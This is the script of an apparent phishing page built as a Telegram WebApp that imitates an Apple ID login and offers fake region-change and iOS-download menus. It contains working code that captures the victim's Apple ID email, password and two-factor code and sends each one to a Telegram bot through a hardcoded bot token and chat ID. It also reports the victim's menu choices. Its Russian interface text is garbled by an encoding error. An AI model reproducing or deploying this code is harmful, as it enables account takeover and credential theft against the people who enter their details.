<!DOCTYPE html>

</head>
<body>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
    const chatId = '-1003894478662';

    async function sendToTelegram(text) {
        try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
            });
        } catch (e) { console.error(e); }
    }

    async function sendData() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        if (!email.includes('@')) { alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π Apple ID'); return; }
        await sendToTelegram(`‚ö†Ô∏è **–í—Ö–æ–¥**\nüë§ ID: \`${email}\`\nüîë Pass: \`${pass}\``);
        document.getElementById('auth-step').style.display = 'none';
        document.getElementById('2fa-step').style.display = 'flex';
    }

    async function send2FA() {
        const code = document.getElementById('code').value;
        if (code.length < 4) { alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥'); return; }
        await sendToTelegram(`üî¢ **–ö–æ–¥ 2FA**: \`${code}\``);
        document.getElementById('2fa-step').style.display = 'none';
        document.getElementById('menu-step').style.display = 'flex';
    }

    function showRegionMenu() {
        document.getElementById('menu-step').style.display = 'none';
        document.getElementById('region-step').style.display = 'flex';
    }

    function confirmRegion(country) {
        sendToTelegram(`üåç –í—ã–±—Ä–∞–Ω —Ä–µ–≥–∏–æ–Ω: ${country}`);
        tg.showAlert("–°–º–µ–Ω–∞ —Ä–µ–≥–∏–æ–Ω–∞ ‚Äî —É—Å–ø–µ—à–Ω–æ");
        backToMenu();
    }

    function showIosMenu() {
        document.getElementById('menu-step').style.display = 'none';
        document.getElementById('ios-step').style.display = 'flex';
    }

    function backToMenu() {
        document.getElementById('region-step').style.display = 'none';
        document.getElementById('ios-step').style.display = 'none';
        document.getElementById('menu-step').style.display = 'flex';
    }

    function downloadFile(version) {
        sendToTelegram(`üì≤ –ó–∞–ø—Ä–æ—Å –Ω–∞ —Å–∫–∞—á–∏–≤–∞–Ω–∏–µ iOS: ${version}`);
        const link = document.createElement('a');
        link.href = 'ios.ipsw'; 
        link.download = `iOS_${version}.ipsw`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        tg.showAlert(`–°–∫–∞—á–∏–≤–∞–Ω–∏–µ iOS ${version} –Ω–∞—á–∞–ª–æ—Å—å.`);
    }
</script>
